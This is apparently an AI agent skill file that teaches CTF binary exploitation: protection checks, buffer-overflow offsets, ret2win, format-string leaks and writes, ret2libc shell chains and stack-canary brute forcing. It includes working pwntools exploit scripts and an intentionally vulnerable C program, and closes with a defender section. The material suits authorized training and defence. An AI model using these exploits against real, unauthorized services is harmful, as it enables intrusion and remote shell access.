---
name: ctf-pwn-basics
description: Use when competing in a CTF pwn (binary exploitation) challenge,
  practicing in a lab, or testing a binary on systems you are authorized to
  test. Covers the full pwn workflow, checking binary protections with
  checksec, fuzzing input handling, exploiting stack buffer overflows to
  hijack control flow, writing format string exploits, building ret2libc and
  basic ROP chains, leaking libc addresses, and writing pwntools exploit
  scripts. Use when a challenge hands you a binary plus an IP and port, when
  you need to turn a crash into a shell, or when you must bypass NX, PIE, or
  stack canaries in an authorized setting.
version: 1.0.0
domain: ctf
lifecycle: stable
last_verified: "2026-10-23"
requires: []
extends: []
relates: [pwn-fundamentals, ctf-reversing-basics]
tools:
  - name: pwntools
    version: "4.13"
  - name: GDB
    version: "15.2"
  - name: ROPgadget
    version: "7.4"
  - name: Ghidra
    version: "11.3"
  - name: Python
    version: "3.12"
---

Binary exploitation (pwn) is the art of turning a memory-safety bug in a
program into control over that program, usually to capture a flag. This skill
covers the standard authorized workflow used in CTF pwn challenges: auditing
the binary's protections, finding the crash, understanding the vulnerable
code path, building a working exploit with pwntools, and adapting when
protections like NX, PIE, ASLR, or stack canaries are enabled. Everything here
applies to CTF competitions, lab environments, and systems you have explicit
permission to test.

## Quick Workflow

1. Run `checksec` on the binary and note NX, PIE, RELRO, canary, and
   Fortify status; the exploit strategy follows from the protections.
2. Run the binary locally, map its normal behavior, and try long or
   malformed inputs to trigger a crash (segfault).
3. Load the binary in Ghidra or a disassembler to find the vulnerable
   function (`gets`, `strcpy`, `scanf %s`, `printf(user_input)`, `read`
   without bounds checks).
4. Generate a cyclic pattern with pwntools, feed it in, and read the crash
   register value to compute the exact offset to the saved return address.
5. Choose the technique that fits the protections: ret2win for a win
   function with no canary, format string for leaks and writes, ret2libc
   when libc is leakable but shellcode is blocked by NX.
6. Write the exploit in pwntools against the local binary first, with
   `context.binary` set, and debug with `gdb.attach`.
7. Leak the needed addresses (libc base via GOT, PIE base via a leak), then
   compute final addresses with the leaked base.
8. Test locally many times (`while` loop with different inputs), then run
   the same script against the remote service and catch the flag.

## 1. checksec and crash triage

Always start with protection auditing. The protections decide which of the
three classic paths (ret2win, shellcode, ret2libc) is viable.

```bash
# pwntools checksec (reads the ELF header protections)
checksec ./vuln
```

Example output shape:

```
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```

Meaning: NX blocks executing injected shellcode, PIE randomizes the binary
base so hardcoded addresses fail, the canary blocks naive return-address
overwrites, and Full RELRO blocks GOT overwrites. With no leak and no
format string, this binary is hard; each disabled protection opens a path.

Crash triage with a pattern:

```bash
# Generate a 200 byte cyclic pattern and crash the binary with it
python3 -c "from pwn import *; print(cyclic(200).decode())" > /tmp/pattern.txt
./vuln < /tmp/pattern.txt   # expect: Segmentation fault

# In gdb, find which pattern bytes landed in RIP
gdb -q ./vuln
(gdb) run < /tmp/pattern.txt
# Program received signal SIGSEGV ... in ... rip = 0x6161616c6261616b
(gdb) quit
python3 -c "from pwn import *; print(cyclic_find(0x6161616c6261616b))"
# 72 -> offset 72 to the saved return address
```

## 2. Stack buffer overflow to ret2win

The simplest pwn: overflow a buffer until you overwrite the saved return
address with the address of a `win()` function that prints the flag.

```c
// typical vulnerable program (vuln.c)
#include <stdio.h>
void win(void) { system("cat flag.txt"); }
int main(void) {
    char buf[64];
    gets(buf);   // no bounds check: classic stack overflow
    return 0;
}
```

pwntools exploit template:

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF("./vuln")
context.terminal = ["tmux", "splitw", "-h"]

OFFSET = 72                    # from cyclic pattern analysis
WIN = elf.symbols["win"]       # address of the win function

def exploit(io):
    io.sendline(b"A" * OFFSET + p64(WIN))
    io.interactive()

if __name__ == "__main__":
    # local = process("./vuln"); remote = remote("chals.ctf", 31337)
    import sys
    io = remote("chals.ctf", 31337) if len(sys.argv) > 1 else process("./vuln")
    exploit(io)
```

When PIE is on but a leak is available, compute `WIN = leak - (leak_offset)`.
When arguments are needed, build a tiny ROP chain with `ROP(elf)` to load
`rdi` before jumping to the target.

## 3. Format string exploitation

If user input reaches `printf` as the format string, you can read and write
arbitrary memory. First find the positional offset of your input on the
stack.

```bash
# Feed format specifiers and count which position echoes your marker
python3 -c "print('AAAA.' + '.'.join('%' + str(i) + '\$p' for i in range(1, 25)))" > /tmp/fmt.txt
./vuln < /tmp/fmt.txt
# look for 0x41414141 in the output; its position N is your stack offset
```

Read a GOT entry to leak libc (pwntools automates the write side too):

```python
from pwn import *

elf = ELF("./vuln")
OFFSET = 6  # position where our input appears (from manual probing)

def leak(addr):
    payload = f"%{OFFSET}$s.AAAA".encode().ljust(16) + p64(addr)
    io.sendline(payload)
    io.recvuntil(b"AAAA\n")  # depends on program output format
    return io.recvline().rstrip(b"\nAAAA")

# leak puts@got -> compute libc base
puts_leak = u64(leak(elf.got["puts"]).ljust(8, b"\x00"))
print(f"puts leaked: {hex(puts_leak)}")
```

For writes, use `%n` with width specifiers (`%1234c%10$n` writes 1234 to the
address at position 10). pwntools `fmtstr_payload(offset, writes)` builds the
whole payload: `fmtstr_payload(6, {elf.got["puts"]: libc.sym.system})`.

## 4. ret2libc: defeating NX

NX marks the stack non-executable, so injected shellcode will not run. The
standard answer is to return into libc functions that already exist in
memory: leak a libc address, compute libc base, then call `system("/bin/sh")`
or build a full ROP chain.

```python
#!/usr/bin/env python3
from pwn import *

elf = ELF("./vuln")
libc = ELF("./libc.so.6")          # provided by the challenge, or match it
rop = ROP(elf)

OFFSET = 72
POP_RDI = rop.find_gadget(["pop rdi", "ret"])[0]
RET = rop.find_gadget(["ret"])[0]  # stack alignment for movaps

# Stage 1: leak puts address via puts(puts@got), then return to main
payload = flat(
    b"A" * OFFSET,
    POP_RDI, elf.got["puts"],
    elf.plt["puts"],
    elf.symbols["main"],
)
io = process("./vuln")
io.sendline(payload)
io.recvline()
puts_leak = u64(io.recvline().strip().ljust(8, b"\x00"))
libc.address = puts_leak - libc.symbols["puts"]
print(f"libc base: {hex(libc.address)}")

# Stage 2: system("/bin/sh") with a ret for 16-byte stack alignment
binsh = next(libc.search(b"/bin/sh"))
payload2 = flat(
    b"A" * OFFSET,
    RET,
    POP_RDI, binsh,
    libc.symbols["system"],
)
io.sendline(payload2)
io.interactive()
```

Key detail: on x86-64, `system` needs 16-byte stack alignment before the
call, so a lone `ret` gadget is placed before `pop rdi`. Missing alignment
is the most common reason a correct-looking ret2libc crashes.

## 5. Bypassing the stack canary

A canary value sits between the buffer and the saved return address; the
program checks it before returning, so a plain overflow is detected and the
program aborts. Bypass paths used in CTFs:

- Leak the canary first (format string read, or a byte-by-byte brute force
  when the program forks per connection), then include the correct canary
  value in the overflow payload.
- Overwrite something other than the return address: a saved frame pointer,
  a function pointer, or a GOT entry via an arbitrary write primitive.
- Abuse `fork()` based servers: the canary is identical across connections
  because fork copies memory, so brute force one byte at a time (256 tries
  per byte, 8 bytes total) and keep the process alive.

```python
# canary brute force sketch (forking server, byte at a time)
canary = b""
for i in range(8):
    for b in range(256):
        io = remote("chals.ctf", 31337)
        io.send(b"A" * OFFSET + canary + bytes([b]))
        resp = io.recvall(timeout=1)
        if b"stack smashing" not in resp:   # this byte did not trip the check
            canary += bytes([b])
            print(f"byte {i}: {hex(b)}")
            break
        io.close()
```

## Edge cases

- PIE enabled with no leak available: look for a partial overwrite (only
  overwrite the low bytes of the return address, since ASLR randomizes only
  the high bytes) or find an info leak first (format string, uninitialized
  memory printed back).
- 32-bit binary: arguments go on the stack, not in registers; use
  `p32` packing and place arguments after the return address instead of
  `pop rdi` gadgets.
- `gets` replaced by `read(0, buf, 0x100)` into a 64 byte buffer: the
  overflow is bounded but still exploitable; compute the exact byte budget
  and keep the ROP chain short, or do it in two stages.
- Remote libc differs from local: identify it with the leaked addresses on
  a libc database (or the challenge provides `libc.so.6`); a wrong libc
  offset silently breaks stage 2.
- The program forks or uses `alarm()`: add timeouts in pwntools
  (`io.recvall(timeout=2)`) and handle restarts; `alarm` kills slow
  interactive sessions.
- Stack alignment crashes on `system`/`execve`: insert a `ret` gadget
  before the final call on x86-64; on some builds you need it before every
  libc call.
- Stripped binary with no symbols: find `main` via the `_start` ->
  `__libc_start_main` argument, and find gadgets with ROPgadget instead of
  relying on symbol names.

## Escalation

- Cyclic offset does not crash RIP but crashes elsewhere: the overflow
  may hit a saved frame pointer or a local variable first; inspect the
  crash in gdb with `info registers` and `x/20gx $rsp` to see where your
  pattern landed.
- Format string offset probing shows no marker: the input may be
  truncated or filtered; try shorter payloads, check for `%` filtering,
  and confirm with `%p.` repeated to see raw stack contents.
- ret2libc stage 1 works locally but fails remotely: the remote libc is
  different; leak two symbols (e.g. `puts` and `read`) and match the pair
  against a libc database to identify the exact build.
- `one_gadget` constraints fail: use `one_gadget ./libc.so.6` to list
  candidates, check each constraint in gdb (`x/i $pc`, register values),
  and fall back to the manual `system("/bin/sh")` chain which has no
  constraints beyond alignment.
- Canary brute force is too slow over the network: check for a format
  string or arbitrary read primitive first; one leak beats 2048 network
  round trips.
- Full RELRO plus PIE plus canary with no leak: look for logic bugs
  instead (UAF, type confusion, integer overflow on allocation size);
  pure memory-corruption basics may not be the intended path.

## Detection and defender view

Defenders see exploitation as a crash loop followed by a successful
interaction, unusually long inputs, format specifiers (`%x`, `%n`) in
network input, and process behavior anomalies (a network daemon spawning a
shell). Mitigations that matter: compile with stack canaries, NX, PIE, and
Full RELRO; use FORTIFY_SOURCE; replace `gets`/`strcpy`/`sprintf` with
bounded versions; run services with seccomp and as unprivileged users; and
monitor for repeated SIGSEGV crashes from one source, which is the classic
brute-force signature. Fuzzing with AFL++ or libFuzzer before release
finds these bugs before attackers do.

## Key references

- MITRE ATT&CK T1068 (Exploitation for Privilege Escalation) and T1203
  (Exploitation for Client Execution): the exploitation phase.
- CWE-121 (Stack-based Buffer Overflow) and CWE-122 (Heap-based Buffer
  Overflow).
- CWE-134 (Use of Externally-Controlled Format String).
- CWE-787 (Out-of-bounds Write): the modern parent weakness.
- pwntools documentation: https://docs.pwntools.com/
- ROP Emporium (practice challenges): https://ropemporium.com/
- LiveOverflow binary exploitation playlist (concepts and gdb workflows).

## See also

- `pwn-fundamentals`: Use it instead for classic stack buffer overflow depth, rather than the broader pwn challenge workflow.
